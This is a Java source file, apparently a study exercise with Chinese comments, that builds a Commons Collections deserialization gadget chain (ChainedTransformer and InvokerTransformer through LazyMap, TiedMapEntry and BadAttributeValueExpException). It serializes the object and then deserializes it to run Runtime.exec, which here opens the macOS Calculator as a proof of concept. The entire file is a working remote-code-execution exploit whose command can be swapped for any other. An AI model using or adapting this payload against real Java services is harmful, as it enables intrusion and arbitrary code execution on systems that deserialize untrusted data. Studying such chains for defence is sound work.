import com.sun.xml.internal.messaging.saaj.util.ByteInputStream;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class LazyMapAttack implements Serializable {
    public static void main(String[]args) throws IOException, InvocationTargetException, InstantiationException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, NoSuchFieldException {
        Transformer[] transformers = new Transformer[]{
                //传入Runtime类
                new ConstantTransformer(Runtime.class),
                //pass
                //反射调用getMethod方法，再反射调用getRuntime方法，返回Runtime.getRuntime()方法
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                //调用invoke方法，再反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"open /System/Applications/Calculator.app"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        //------------------------transform()方法利用方式----------------------------
        Map innerMap = new HashMap();
//        innerMap.put("1","2");
        //通过LazyMap.decorate()方法获取LazyMap实例对象
        Map lazyMap = LazyMap.decorate(innerMap,transformerChain);
     //   lazyMap.get("LeEas1na");
        //-----------------------反序列化自动化---------------------------
        TiedMapEntry entry = new TiedMapEntry(lazyMap,null);//获取了 TiedMapEntry 实例对象
        BadAttributeValueExpException ins = new BadAttributeValueExpException(null);//获取了 BadAttributeValueExpException 实例对象
        Field valfield = ins.getClass().getDeclaredField("val");//通过 class.getDeclaredField() 方法获取到 val 变量
        valfield.setAccessible(true);   //setAccessible() 方法去除 val 变量为私有变量的限制
        valfield.set(ins,entry);//通过 set() 方法进行赋值

        ByteArrayOutputStream exp = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(exp);
        oos.writeObject(ins);
        oos.flush();
        oos.close();
        ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(out);
        Object obj = (Object) ois.readObject();
        ois.close();
    }
}
